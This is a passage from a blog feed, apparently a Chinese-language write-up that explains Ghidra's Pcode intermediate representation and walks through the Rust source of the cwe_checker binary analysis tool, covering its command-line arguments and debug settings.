href="https://www.kanxue.com/book-24-116.htm#msg_header_h1_1">https://www.kanxue.com/book-24-116.htm#msg_header_h1_1</a></p><p>恢复符号表：<a href="https://xz.aliyun.com/news/15811">https://xz.aliyun.com/news/15811</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;前两天投的一家公司测试题就是 Unity 逆向，现学了一下做一些记录&lt;/p&gt;
&lt;h2 id=&quot;题目信息&quot;&gt;&lt;a href=&quot;#题目信息&quot; class=&quot;headerlink&quot; title=&quot;题目信息&quot;&gt;&lt;/a&gt;题目信息&lt;/h2&gt;&lt;p&gt;题目描述：一个标准的unity游戏，请使</summary>
      
    
    
    
    <category term="reverse" scheme="https://starrysky1004.github.io/categories/reverse/"/>
    
    
    <category term="reverse" scheme="https://starrysky1004.github.io/tags/reverse/"/>
    
    <category term="Unity" scheme="https://starrysky1004.github.io/tags/Unity/"/>
    
  </entry>
  
  <entry>
    <title>cwe_checker源码分析（更新中）</title>
    <link href="https://starrysky1004.github.io/2025/11/06/cwe-checker-yuan-ma-fen-xi-geng-xin-zhong/cwe-checker-yuan-ma-fen-xi-geng-xin-zhong/"/>
    <id>https://starrysky1004.github.io/2025/11/06/cwe-checker-yuan-ma-fen-xi-geng-xin-zhong/cwe-checker-yuan-ma-fen-xi-geng-xin-zhong/</id>
    <published>2025-11-06T07:53:32.000Z</published>
    <updated>2025-11-06T07:59:37.953Z</updated>
    
    <content type="html"><![CDATA[<p>实习的时候刚好接触到这个工具，想着学一下静态分析，网上也没搜到相关源码分析…只能自己看了orz，还特地学了一周 rust 哈哈哈</p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="Pcode"><a href="#Pcode" class="headerlink" title="Pcode"></a>Pcode</h3><p><strong>IR</strong> （Intermediate Representation）是中间表示的缩写，指在编译器或二进制分析工具中，将原始的机器代码或汇编代码转换为一种中间抽象形式，以便于进行分析和优化</p><p><strong>Pcode</strong>（Program Code）是 Ghidra 反汇编器使用的中间表示（IR）。它是 Ghidra 将二进制代码分析后的低级表示形式，提供了一种独立于特定 CPU 架构的二进制代码表示，每条汇编指令被分解为一系列 Pcode 操作（一条汇编指令对应多个 Pcode 操作），常见 Pcode 操作码类型：</p><ul><li>算术运算：<code>INT_ADD</code>, <code>INT_SUB</code>, <code>INT_MULT</code>, <code>INT_DIV</code>, <code>INT_REM</code></li><li>逻辑运算：<code>INT_AND</code>, <code>INT_OR</code>, <code>INT_XOR</code>, <code>INT_NEGATE</code></li><li>移位操作：<code>INT_LEFT</code>, <code>INT_RIGHT</code>, <code>INT_SRIGHT</code></li><li>内存操作：<code>LOAD</code>, <code>STORE</code></li><li>数据转换：<code>INT_ZEXT</code>, <code>INT_SEXT</code>, <code>INT_CARRY</code>, <code>INT_SCARRY</code></li><li>控制流：<code>BRANCH</code>, <code>CBRANCH</code>, <code>CALL</code>, <code>CALLIND</code>, <code>RETURN</code></li><li>复制：<code>COPY</code></li></ul><p><strong>Varnode</strong> 是 Pcode 中的基本数据单位，用于在 Pcode Raw 的 inputs &#x2F; output 字段描述 输入 &#x2F; 输出变量信息，包含：</p><ul><li>**<code>size</code>**：数据大小（字节数）</li><li>**<code>address_space</code>**：地址空间类型（const &#x2F; register &#x2F; ram 内存地址 &#x2F; unique 临时变量 &#x2F; stack）</li><li>**<code>address_space_offset</code>**：在地址空间中的偏移（寄存器名 &#x2F; 数值）</li><li>**<code>pointer_size</code>**：指针大小（用于地址计算）</li></ul><p><strong>Pcode Raw</strong> 是 Ghidra 的 Pcode Extractor 插件输出的 json 格式文件，包含程序结构（函数、基本块）、Pcode 操作、寄存器信息、调用约定（函数调用和返回）、数据类型属性（数据类型的尺寸信息）</p><p>Pcode Raw 文件结构：</p><ul><li>**<code>program.functions</code>**：程序中的所有函数列表</li><li>**<code>register_properties</code>**：CPU 寄存器的层次结构和属性</li><li>**<code>calling_conventions</code>**：函数调用约定（参数传递、返回值等）</li><li>**<code>datatype_properties</code>**：C 数据类型的尺寸信息</li><li>**<code>image_base</code>**：程序在内存中的基址</li></ul><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"program"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token property">"functions"</span><span class="token operator">:</span> <span class="token punctuation">[</span>      <span class="token punctuation">&#123;</span>        <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"函数名"</span><span class="token punctuation">,</span>        <span class="token property">"address"</span><span class="token operator">:</span> <span class="token string">"函数地址"</span><span class="token punctuation">,</span>        <span class="token property">"blocks"</span><span class="token operator">:</span> <span class="token punctuation">[</span>          <span class="token punctuation">&#123;</span>            <span class="token property">"address"</span><span class="token operator">:</span> <span class="token string">"基本块地址"</span><span class="token punctuation">,</span>            <span class="token property">"instructions"</span><span class="token operator">:</span> <span class="token punctuation">[</span>              <span class="token punctuation">&#123;</span>                <span class="token property">"mnemonic"</span><span class="token operator">:</span> <span class="token string">"汇编指令助记符"</span><span class="token punctuation">,</span>                <span class="token property">"address"</span><span class="token operator">:</span> <span class="token string">"指令地址"</span><span class="token punctuation">,</span>                <span class="token property">"size"</span><span class="token operator">:</span> 指令字节大小<span class="token punctuation">,</span>                <span class="token property">"terms"</span><span class="token operator">:</span> <span class="token punctuation">[</span>                  <span class="token punctuation">&#123;</span>                    <span class="token property">"address"</span><span class="token operator">:</span> <span class="token string">"操作地址"</span><span class="token punctuation">,</span>                    <span class="token property">"index"</span><span class="token operator">:</span> 操作索引<span class="token punctuation">,</span>                    <span class="token property">"operation"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                      <span class="token property">"pcode_mnemonic"</span><span class="token operator">:</span> <span class="token string">"Pcode操作码"</span><span class="token punctuation">,</span>                      <span class="token property">"output"</span><span class="token operator">:</span> 输出varnode<span class="token punctuation">,</span>                      <span class="token property">"inputs"</span><span class="token operator">:</span> <span class="token punctuation">[</span>输入varnode列表<span class="token punctuation">]</span>                    <span class="token punctuation">&#125;</span>                  <span class="token punctuation">&#125;</span>                  <span class="token property">"potential_targets"</span><span class="token operator">:</span> <span class="token string">"间接控制流转移的潜在目标地址列表（存在 jmp / call）"</span><span class="token punctuation">,</span>                  <span class="token property">"fall_through"</span><span class="token operator">:</span> <span class="token string">"顺序执行的下一条指令地址"</span>                <span class="token punctuation">]</span>              <span class="token punctuation">&#125;</span>            <span class="token punctuation">]</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">]</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">]</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"register_properties"</span><span class="token operator">:</span> <span class="token punctuation">[</span>...<span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token property">"cpu_arch"</span><span class="token operator">:</span> <span class="token string">"CPU架构名称"</span><span class="token punctuation">,</span>  <span class="token property">"external_functions"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>...<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"entry_points"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"入口点地址列表"</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token property">"stack_pointer_register"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>...<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"calling_conventions"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>...<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"datatype_properties"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>...<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token property">"image_base"</span><span class="token operator">:</span> <span class="token string">"程序基址"</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>汇编转 Pcode 示例</strong>：</p><p>汇编：</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0x1000: push   %rbp        ; 保存基指针0x1001: mov    %rsp,%rbp   ; 设置新的基指针0x1004: add    %esi,%edi   ; EDI &#x3D; EDI + ESI0x1007: pop    %rbp        ; 恢复基指针0x1008: ret                ; 返回<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>Pcode：</p><pre class="line-numbers language-peoplecode" data-language="peoplecode"><code class="language-peoplecode">INT_SUB RSP <span class="token operator">-</span> <span class="token number">8</span> → RSPSTORE RSP ← RBP<span class="token operator">/</span><span class="token operator">/</span> push   <span class="token variable">%rbp</span> COPY RSP → RBP<span class="token operator">/</span><span class="token operator">/</span> mov <span class="token variable">%rsp</span><span class="token punctuation">,</span><span class="token variable">%rbp</span>INT_ADD EDI<span class="token punctuation">,</span> ESI → EAX <span class="token operator">/</span><span class="token operator">/</span> add <span class="token variable">%esi</span><span class="token punctuation">,</span><span class="token variable">%edi</span>LOAD RSP → RBPINT_ADD RSP <span class="token operator">+</span> <span class="token number">8</span> → RSP <span class="token operator">/</span><span class="token operator">/</span> pop <span class="token variable">%rbp</span><span class="token keyword">RETURN</span>    <span class="token operator">/</span><span class="token operator">/</span> ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>Pcode 在 Pcode Raw 的 instructions 字段中的表示：</strong>以 push 为例</p><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>             <span class="token property">"mnemonic"</span><span class="token operator">:</span> <span class="token string">"push"</span><span class="token punctuation">,</span>             <span class="token property">"address"</span><span class="token operator">:</span> <span class="token string">"0x1000"</span><span class="token punctuation">,</span>             <span class="token property">"size"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>             <span class="token property">"terms"</span><span class="token operator">:</span> <span class="token punctuation">[</span>             <span class="token comment">// Pcode 指令1：INT_SUB RSP - 8 → RSP</span>               <span class="token punctuation">&#123;</span>                 <span class="token property">"address"</span><span class="token operator">:</span> <span class="token string">"0x1000"</span><span class="token punctuation">,</span>                 <span class="token property">"index"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>                 <span class="token property">"operation"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                   <span class="token property">"pcode_mnemonic"</span><span class="token operator">:</span> <span class="token string">"INT_SUB"</span><span class="token punctuation">,</span><span class="token comment">// Pcode 操作码</span>                   <span class="token property">"input0"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token comment">// 输入1：RSP</span>                     <span class="token property">"size"</span><span class="token operator">:</span> <span class="token number">8</span><span class="token punctuation">,</span>                     <span class="token property">"address_space"</span><span class="token operator">:</span> <span class="token string">"register"</span><span class="token punctuation">,</span>                     <span class="token property">"address_space_offset"</span><span class="token operator">:</span> <span class="token string">"RSP"</span><span class="token punctuation">,</span>                     <span class="token property">"pointer_size"</span><span class="token operator">:</span> <span class="token number">8</span><span class="token punctuation">,</span>                     <span class="token property">"register_name"</span><span class="token operator">:</span> <span class="token string">"RSP"</span><span class="token punctuation">,</span>                     <span class="token property">"register_size"</span><span class="token operator">:</span> <span class="token number">8</span>                   <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                   <span class="token property">"input1"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token comment">// 输入2：8</span>                     <span class="token property">"size"</span><span class="token operator">:</span> <span class="token number">8</span><span class="token punctuation">,</span>                     <span class="token property">"address_space"</span><span class="token operator">:</span> <span class="token string">"const"</span><span class="token punctuation">,</span>                     <span class="token property">"address_space_offset"</span><span class="token operator">:</span> <span class="token string">"8"</span><span class="token punctuation">,</span>                     <span class="token property">"pointer_size"</span><span class="token operator">:</span> <span class="token number">8</span><span class="token punctuation">,</span>                     <span class="token property">"register_name"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>                     <span class="token property">"register_size"</span><span class="token operator">:</span> <span class="token null keyword">null</span>                   <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                   <span class="token property">"input2"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span><span class="token comment">// 无第三个输入</span>                   <span class="token property">"output"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token comment">// 输出：RSP</span>                     <span class="token property">"size"</span><span class="token operator">:</span> <span class="token number">8</span><span class="token punctuation">,</span>                     <span class="token property">"address_space"</span><span class="token operator">:</span> <span class="token string">"register"</span><span class="token punctuation">,</span>                     <span class="token property">"address_space_offset"</span><span class="token operator">:</span> <span class="token string">"RSP"</span><span class="token punctuation">,</span>                     <span class="token property">"pointer_size"</span><span class="token operator">:</span> <span class="token number">8</span><span class="token punctuation">,</span>                     <span class="token property">"register_name"</span><span class="token operator">:</span> <span class="token string">"RSP"</span><span class="token punctuation">,</span>                     <span class="token property">"register_size"</span><span class="token operator">:</span> <span class="token number">8</span>                   <span class="token punctuation">&#125;</span>                 <span class="token punctuation">&#125;</span>               <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>               <span class="token comment">// Pcode 指令2：STORE RSP ← RBP</span>               <span class="token punctuation">&#123;</span>                 <span class="token property">"address"</span><span class="token operator">:</span> <span class="token string">"0x1000"</span><span class="token punctuation">,</span>                 <span class="token property">"index"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>                 <span class="token property">"operation"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                   <span class="token property">"pcode_mnemonic"</span><span class="token operator">:</span> <span class="token string">"STORE"</span><span class="token punctuation">,</span><span class="token comment">// Pcode 操作码</span>                   <span class="token property">"input0"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>   <span class="token comment">// 输入1：RSP</span>                     <span class="token property">"size"</span><span class="token operator">:</span> <span class="token number">8</span><span class="token punctuation">,</span>                     <span class="token property">"address_space"</span><span class="token operator">:</span> <span class="token string">"register"</span><span class="token punctuation">,</span>                     <span class="token property">"address_space_offset"</span><span class="token operator">:</span> <span class="token string">"RSP"</span><span class="token punctuation">,</span>                     <span class="token property">"pointer_size"</span><span class="token operator">:</span> <span class="token number">8</span><span class="token punctuation">,</span>                     <span class="token property">"register_name"</span><span class="token operator">:</span> <span class="token string">"RSP"</span><span class="token punctuation">,</span>                     <span class="token property">"register_size"</span><span class="token operator">:</span> <span class="token number">8</span>                   <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                   <span class="token property">"input1"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>   <span class="token comment">// 输入2：RBP</span>                     <span class="token property">"size"</span><span class="token operator">:</span> <span class="token number">8</span><span class="token punctuation">,</span>                     <span class="token property">"address_space"</span><span class="token operator">:</span> <span class="token string">"register"</span><span class="token punctuation">,</span>                     <span class="token property">"address_space_offset"</span><span class="token operator">:</span> <span class="token string">"RBP"</span><span class="token punctuation">,</span>                     <span class="token property">"pointer_size"</span><span class="token operator">:</span> <span class="token number">8</span><span class="token punctuation">,</span>                     <span class="token property">"register_name"</span><span class="token operator">:</span> <span class="token string">"RBP"</span><span class="token punctuation">,</span>                     <span class="token property">"register_size"</span><span class="token operator">:</span> <span class="token number">8</span>                   <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>                   <span class="token property">"input2"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>                   <span class="token property">"output"</span><span class="token operator">:</span> <span class="token null keyword">null</span>                 <span class="token punctuation">&#125;</span>               <span class="token punctuation">&#125;</span>             <span class="token punctuation">]</span><span class="token punctuation">,</span>             <span class="token property">"potential_targets"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span><span class="token comment">// 没有可能跳转的地址</span>             <span class="token property">"fall_through"</span><span class="token operator">:</span> <span class="token string">"0x1001"</span><span class="token comment">// 顺序执行的下一条指令地址</span>           <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="cwe-checker-源码分析"><a href="#cwe-checker-源码分析" class="headerlink" title="cwe_checker 源码分析"></a>cwe_checker 源码分析</h2><h3 id="caller-x2F-src-x2F-main-rs"><a href="#caller-x2F-src-x2F-main-rs" class="headerlink" title="caller&#x2F;src&#x2F;main.rs"></a>caller&#x2F;src&#x2F;main.rs</h3><p>功能：CWE 检查器的命令行界面，主程序</p><h4 id="import-module-导入模块"><a href="#import-module-导入模块" class="headerlink" title="import module 导入模块"></a>import module 导入模块</h4><p>从 cwe_checker_lib 库导入的模块</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">use</span> <span class="token namespace">cwe_checker_lib<span class="token punctuation">::</span>analysis<span class="token punctuation">::</span></span>graph<span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token namespace">cwe_checker_lib<span class="token punctuation">::</span>checkers<span class="token punctuation">::</span></span><span class="token class-name">CweModule</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token namespace">cwe_checker_lib<span class="token punctuation">::</span>pipeline<span class="token punctuation">::</span></span><span class="token punctuation">&#123;</span>disassemble_binary<span class="token punctuation">,</span> <span class="token class-name">AnalysisResults</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token namespace">cwe_checker_lib<span class="token punctuation">::</span>utils<span class="token punctuation">::</span>binary<span class="token punctuation">::</span></span><span class="token class-name">BareMetalConfig</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token namespace">cwe_checker_lib<span class="token punctuation">::</span>utils<span class="token punctuation">::</span></span>debug<span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token namespace">cwe_checker_lib<span class="token punctuation">::</span>utils<span class="token punctuation">::</span>log<span class="token punctuation">::</span></span><span class="token punctuation">&#123;</span>print_all_messages<span class="token punctuation">,</span> <span class="token class-name">CweWarning</span><span class="token punctuation">,</span> <span class="token class-name">LogLevel</span><span class="token punctuation">,</span> <span class="token class-name">LogMessage</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token namespace">cwe_checker_lib<span class="token punctuation">::</span>utils<span class="token punctuation">::</span></span>read_config_file<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用本地的 caller&#x2F;src&#x2F;cfg_stats.rs 模块（控制流图统计）</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">mod</span> <span class="token module-declaration namespace">cfg_stats</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="main-入口点"><a href="#main-入口点" class="headerlink" title="main 入口点"></a>main 入口点</h4><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">fn</span> <span class="token function-definition function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Error</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>    <span class="token comment">/// 主函数入口</span>    <span class="token keyword">let</span> cmdline_args <span class="token operator">=</span> <span class="token class-name">CmdlineArgs</span><span class="token punctuation">::</span><span class="token function">parse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// clap::Parser 自动生成的 parse()</span>    <span class="token function">run_with_ghidra</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>cmdline_args<span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="CmdlineArgs-参数解析"><a href="#CmdlineArgs-参数解析" class="headerlink" title="CmdlineArgs 参数解析"></a>CmdlineArgs 参数解析</h4><p>参数示例： <code>cwe_checker binary --partial CWE476,CWE416 --json -o results.json</code></p><ul><li><p>binary：指定二进制文件路径，除非使用 module_versions 参数否则必填，并且会调用 check_file_existence 检查文件是否存在，返回文件路径字符串</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token comment">/// 仅当 file_path 指向现有文件时才返回 Ok(file_path)</span><span class="token keyword">fn</span> <span class="token function-definition function">check_file_existence</span><span class="token punctuation">(</span>file_path<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token keyword">str</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token class-name">Result</span><span class="token operator">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token operator">></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token namespace">std<span class="token punctuation">::</span>fs<span class="token punctuation">::</span></span><span class="token function">metadata</span><span class="token punctuation">(</span>file_path<span class="token punctuation">)</span>        <span class="token punctuation">.</span><span class="token function">map_err</span><span class="token punctuation">(</span><span class="token closure-params"><span class="token closure-punctuation punctuation">|</span>err<span class="token closure-punctuation punctuation">|</span></span> <span class="token macro property">format!</span><span class="token punctuation">(</span><span class="token string">"&#123;err&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">?</span>        <span class="token punctuation">.</span><span class="token function">is_file</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token class-name">Ok</span><span class="token punctuation">(</span>file_path<span class="token punctuation">.</span><span class="token function">to_string</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Err</span><span class="token punctuation">(</span><span class="token macro property">format!</span><span class="token punctuation">(</span><span class="token string">"&#123;file_path&#125; is not a file."</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>module_versions：打印所有已知模块的版本号，不需要参数</p></li><li><p>config：指定自定义配置文件路径，可以用缩写 -c，会调用 check_file_existence 检查文件是否存在，返回文件路径字符串</p></li><li><p>out：将结果写入指定文件，不输出到不准输出，可以使用缩写 -o</p></li><li><p>partial：指定要运行的特定检查集， 使用<code>,</code>分割，可以使用缩写 <code>-p</code>，例如<code>-p CWE332,CWE476,CWE782</code></p></li><li><p>json：生成 json 输出，不需要参数，可以使用缩写 -j</p></li><li><p>quiet：静默输出，不打印日志消息，不需要参数，可以使用缩写 -q</p></li><li><p>verbose：打印额外的调试日志消息，不需要参数，可以使用缩写 -v，与 quiet 不能同时使用</p></li><li><p>statistics：在日志消息中包含各种统计信息，不需要参数，与 quiet 不能同时使用</p></li><li><p>bare_metal_config：用于裸机二进制分析的配置文件路径，输入二进制文件都将被视为裸机二进制文件，会调用 check_file_existence 检查文件是否存在，返回文件路径字符串</p></li><li><p>debug：用于调试目的的输出，参数为 CliDebugMode 枚举类型成员</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token attribute attr-name">#[derive(ValueEnum, Clone, Debug, Copy)]</span><span class="token comment">/// 选择要显示的调试输出类型</span><span class="token keyword">pub</span> <span class="token keyword">enum</span> <span class="token type-definition class-name">CliDebugMode</span> <span class="token punctuation">&#123;</span> <span class="token comment">// Ghidra插件的原始输出</span>    <span class="token class-name">PcodeRaw</span><span class="token punctuation">,</span> <span class="token comment">// Ghidra插件的输出反序列化到 Rust 类型</span>    <span class="token class-name">PcodeParsed</span><span class="token punctuation">,</span> <span class="token comment">// 程序的第一个IR表示</span>    <span class="token class-name">IrEarly</span><span class="token punctuation">,</span> <span class="token comment">// 在函数内基本块被正常排序之后</span>    <span class="token class-name">IrFnBlksSorted</span><span class="token punctuation">,</span> <span class="token comment">// 在非返回外部函数被标记之后</span>    <span class="token class-name">IrNonRetExtFunctionsMarked</span><span class="token punctuation">,</span> <span class="token comment">// 在外部函数存根调用被替换为外部函数调用之后</span>    <span class="token class-name">IrExtCallsReplaced</span><span class="token punctuation">,</span> <span class="token comment">// 在现有引用块被内联到函数中之后</span>    <span class="token class-name">IrInlined</span><span class="token punctuation">,</span> <span class="token comment">// 在子寄存器替换过程之后</span>    <span class="token class-name">IrSubregistersSubstituted</span><span class="token punctuation">,</span> <span class="token comment">// 在所有控制流转换都有有效目标之后</span>    <span class="token class-name">IrCfPatched</span><span class="token punctuation">,</span> <span class="token comment">// 在空函数被移除之后</span>    <span class="token class-name">IrEmptyFnRemoved</span><span class="token punctuation">,</span> <span class="token comment">// 未优化的IR</span>    <span class="token class-name">IrRaw</span><span class="token punctuation">,</span> <span class="token comment">// 在函数的不可达基本块被移除之后</span>    <span class="token class-name">IrIntraproceduralDeadBlocksElimed</span><span class="token punctuation">,</span> <span class="token comment">// 在平凡表达式被替换为其结果之后</span>    <span class="token class-name">IrTrivialExpressionsSubstituted</span><span class="token punctuation">,</span> <span class="token comment">// 在输入表达式沿着变量赋值传播之后</span>    <span class="token class-name">IrInputExpressionsPropagated</span><span class="token punctuation">,</span> <span class="token comment">// 在死变量赋值被移除之后</span>    <span class="token class-name">IrDeadVariablesElimed</span><span class="token punctuation">,</span> <span class="token comment">// 在具有相同条件的条件语句的控制流被简化之后</span>    <span class="token class-name">IrControlFlowPropagated</span><span class="token punctuation">,</span> <span class="token comment">// 在栈指针通过逻辑AND对齐被替换为减法操作之后</span>    <span class="token class-name">IrStackPointerAlignmentSubstituted</span><span class="token punctuation">,</span> <span class="token comment">// 最终的IR</span>    <span class="token class-name">IrOptimized</span><span class="token punctuation">,</span> <span class="token comment">// 整个程序的调用图</span>    <span class="token class-name">Cg</span><span class="token punctuation">,</span> <span class="token comment">// 整个程序的控制流图</span>    <span class="token class-name">Cfg</span><span class="token punctuation">,</span> <span class="token comment">// 指针推理计算结果</span>    <span class="token class-name">Pi</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>pcode_raw：从文件读取保存的 Pcode 提取器插件输出，而不是调用 Ghidra</p></li><li><p>cfg_stats：打印 IR 程序CFG的统计信息和指标并退出，不需要参数（如函数内圈复杂度、基本块数、指令数、外部函数被调用次数等）</p></li></ul><h4 id="run-with-ghidra-主要函数"><a href="#run-with-ghidra-主要函数" class="headerlink" title="run_with_ghidra 主要函数"></a>run_with_ghidra 主要函数</h4><p>功能：以 Ghidra 作为后端运行 cwe_checker</p><ul><li><p>调用 <code>impl From&lt;&amp;CmdlineArgs&gt; for debug::Settings</code> 将 args 程序参数转换为目标类型</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">let</span> debug_settings <span class="token operator">=</span> args<span class="token punctuation">.</span><span class="token function">into</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><p>处理 debug：获取指定的 debug 模式（全部模式见 CliDebugMode 类型），未指定则使用默认值，即不调试</p></li><li><p>处理 verbose：指定日志详细程度，包括指定 –verbose 详细模式；–quiet 静默模式；未指定 默认模式</p></li><li><p>构建 Settings 对象，设置默认值</p></li><li><p>处理 –pcode-raw：选择保存 Pcode 的文件路径</p></li><li><p>构建最终的 Settings 对象，返回 debug::Settings 结构体</p><pre class="line-numbers language-rust" data-language="rust"><code class="language-rust"><span class="token keyword">impl</span> <span class="token class-name">From</span><span class="token operator">&lt;</span><span class="token operator">&amp;</span><span class="token class-name">CmdlineArgs</span><span class="token operator">></span> <span class="token keyword">for</span> <span class="token namespace">debug<span class="token punctuation">::</span></span><span class="token class-name">Settings</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/// 将命令行参数转换为调试设置</span>    <span class="token keyword">fn</span> <span class="token function-definition function">from</span><span class="token punctuation">(</span>args<span class="token punctuation">:</span> <span class="token operator">&amp;</span><span class="token class-name">CmdlineArgs</span><span class="token punctuation">)</span> <span class="token punctuation">-></span> <span class="token keyword">Self</span> <span class="token punctuation">&#123;</span>        <span class="token comment">// 处理 debug 参数</span>        <span class="token keyword">let</span> stage <span class="token operator">=</span> <span class="token keyword">match</span> <span class="token operator">&amp;</span>args<span class="token punctuation">.</span>debug <span class="token punctuation">&#123;</span> <span class="token comment">// debug mode 值见 CliDebugMode</span>            <span class="token class-name">None</span> <span class="token operator">=></span> <span class="token namespace">debug<span class="token punctuation">::</span></span><span class="token class-name">Stage</span><span class="token punctuation">::</span><span class="token function">default</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token 